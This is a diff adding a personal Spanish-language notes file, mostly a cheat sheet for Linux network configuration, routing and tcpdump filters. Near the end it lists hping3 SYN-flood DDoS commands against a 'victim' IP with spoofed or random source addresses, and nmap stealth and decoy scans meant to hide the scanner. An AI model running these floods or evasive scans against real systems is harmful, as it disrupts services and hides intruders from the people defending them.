@@ -1,0 +1,160 @@
+vender maquina amazon
+buscar alojamiento
+empezar a trabajar
+	terminar el de quiniela
+	agenda.com.ar
+	
+
+CONFIGURAR IP CON COMANDO VOLATIL
+----------------------------------
+ifconfig interfaz ip-fija -> asigna ip-fija a interfaz, los otros parametros toman valores default, esto es que a mascara de subred  se asignara dependiendo la clase a la que pertenece ip-fija
+
+ifconfig eth0 up 172.20.51.99 netmask 255.255.0.0 gw 172.20.51.1
+
+
+CONFIGURAR IP EN ARCHIVO 
+-------------------------
+/etc/network/interfaces
+
+iface eth1 inet static
+address 192.168.1.41
+netmask 255.255.255.0
+network 192.168.1.0
+broadcast 192.168.1.255
+gateway 192.168.1.1
+
+
+iface eth0 inet dhcp
+si no da ip revisa que el paquete dhcp3-client esté instalado. Si no, instálalo con,
+# apt-get install dhcp3-client
+
+forzar el contacto con el servidor DHCP corriendo 'dhclient eth0',
+# dhclient eth0
+-----------------------------------------
+
+/etc/resolv.conf -> dns
+
+Revisa si la definición del servidor de nombres de dominio (DNS) está correcta. Esta se encuentra en el archivo /etc/resolv.conf y debería decir algo así,
+search blog.solusan.com 202.89.70.31
+nameserver 4.2.2.2
+en dónde el valor de search debería ser el dominio de la red local. La entrada nameserver define el número IP del DNS. Este valor debe ser suministrado por el administrador de la red. Si haces modificaciones a estos valores reinicia la red con '/etc/init.d/networking restart'.
+
+
+----------------------------
+route [del|add] [-net|-host] destino [if] -> route permite añadir o eliminar rutas hacia destino. -net y -host determinan si destino es una red o uun host. if permite opcionalmente determinar a que interfaz de red se dirige la ruta
+
+configurar el gateway de nuestra maquina de dos maneras diferentes:
+ip route add default via ip-gateway
+route add default gw ip-gateway
+
+indicar a nuestra tabla de ruteo ip que alcance a la red 10.0.0.x por la puerta de enlace 192.168.1.192
+ip route add 10.0.0.0 netmask 255.255.255.0 via 192.168.1.192
+
+ip route -> consulta las rutas establecidas para acceder a diferentes redes de nuestra tabla de ruteo ip
+/sbin/route -> vizualiza la tabla ip del kernel
+
+ver tablas de enrutamiento
+netstat -rn
+
+ver servicios que ofrece nuestra maquina
+netstat -atu | grep '*:*' | more 
+
+
+TCPDUMP
+--------
+Capturar tráfico cuya dirección IP de origen sea 192.168.3.1
+tcpdump src host 192.168.3.1
+
+Capturar tráfico cuya dirección origen o destino sea 192.168.3.2
+tcpdump host 192.168.3.2
+
+Capturar el tráfico con destino a la dirección ethernet 0:2:a5:ee:ec:10.
+tcpdump ether dst 0:2:a5:ee:ec:10
+
+Capturar el tráfico que vaya a la máquina cuya dirección MAC es 0:2:a5:ee:ec:10.
+tcpdump ether host 0:2:a5:ee:ec:10
+
+Capturar tráfico con red destino 192.168.3.0
+tcpdump dst net 192.168.3.0
+
+Capturar tráfico con red origen 192.168.3.0/28
+tcpdump src net 192.168.3.0 mask 255.255.255.240
+tcpdump src net 192.168.3.0/28
+
+Capturar todo el tráfico con origen o destino en la 10.0.0.0/24
+tcpdump net 10.0.0.0/24
+
+Capturar tráfico con destino el puerto 23
+tcpdump dst port 23
+
+Capturar tráfico con origen o destino el puerto 110
+tcpdump port 110
+
+Capturar los paquetes de tipo ICMP
+tcpdump ip proto \icmp
+
+capturar los paquetes de tipo UDP
+tcpdump ip proto \udp
+tcpdump udp
+
+Capturar todo tráfico arp
+tcpdump -n ether proto \\arp
+tcpdump -n arp
+
+Capturar todo tráfico ip
+tcpdump -n ether proto \\ip
+tcpdump -n ipi
+
+Capturar el tráfico Web
+tcpdump tcp and port 80
+
+Capturar las peticiones de DNS
+tcpdump udp and dst port 53
+
+Capturar el tráfico al puerto telnet o SSH
+tcpdump tcp and (port 22 or port 23)
+
+Capturar todo el tráfico excepto el web
+tcpdump tcp and not port 80
+
+
+
+hping3
+-----------
+HPing es una herramienta en linea de comandos que nos permite crear y analizar paquetes TCP/IP, y como tal tiene un muchas utilidades: hacer testing de firewalls, escaneo de puertos, redes y como no… también tiene la capacidad de provocar un SYN Flood Attack (DD0S).
+
+apt-get install hping3
+
+
+Un ataque clásico de DDoS sería el siguiente
+hping3 -p 80  -S --flood ip_victima
+hping3 -a ip_falsa -p 80  -S --flood ip_victima
+hping3 --rand-source -p 80  -S --flood ip_victima
+
+nmap
+----
+nmap 192.168.0.1 -> que  puertos tiene abiertos
+nmap -o 192.168.0.1 -> que tipo de sistema operativo, esta corriendo el host al que le realizamos el scaneo
+nmap -sP 192.168.0.1-255 -> realizar un ping sca, IDENTIFICANDO LOS HOSTS ACTIVOS, EN NUESTRA RED
+REALIZANDO STEALTH SCANS.
+sN: Stealth, Null Scan, este tipo de scan pone en off todos los flags.
+sF: Stealth FIN Scan, este tipo de scan usa paquetes con el flag FIN activado para las pruebas.
+sX: Stealth Xmas Tree Scan, este tipo de scan envía paquetes con los flag FIN, URG, y PUSH activados.
+sp: Ping Scan, realiza un scan dentro de un rango especifico de hosts. Útil para conocer que hosts se encuentran en linea sin ser detectados.
+nmap -sX -O 192.168.1.2 ->  hacer un stealth scan del tipo Xmas Tree, y ademas deseamos conocer que sistema operativo esta corriendo el host de destino
+
+nmap -p 25,53 -sX -P0 -D 1.2.3.4,5.6.7.8 192.168.0.1
+ realizamos un Stealth Xmas Tree scan (-sX) hacia el
+host 192.168.0.1, en los puertos 25(SMTP), 53(DNS), le indicamos a nmap que
+no genere pings hacia el host, y tratamos de engañar al host (-D, Decoy), haciéndole
+creer que los scans se están generando desde los hosts 1.2.3.4 y 5.6.7.8.
+
+nmap -sX -O 192.168.1.2 -oN scanresult.txt 
+hacer un stealth scan del tipo Xmas Tree, también deseamos conocer
+que sistema operativo esta corriendo el host de destino, y además deseamos
+guardar el resultado de este scan en un archivo llamado "scanresult.txt", 
+
+nmap -sX -O 192.168.1.1-255 -oN scanresult.txt
+realizar el scan anterior pero dentro de un rango de hosts específicos, digamos del host
+192.168.1.1 hasta la ip 192.168.1.255 , y deseamos guardar el resultado del
+scan en un archivo de texto normal
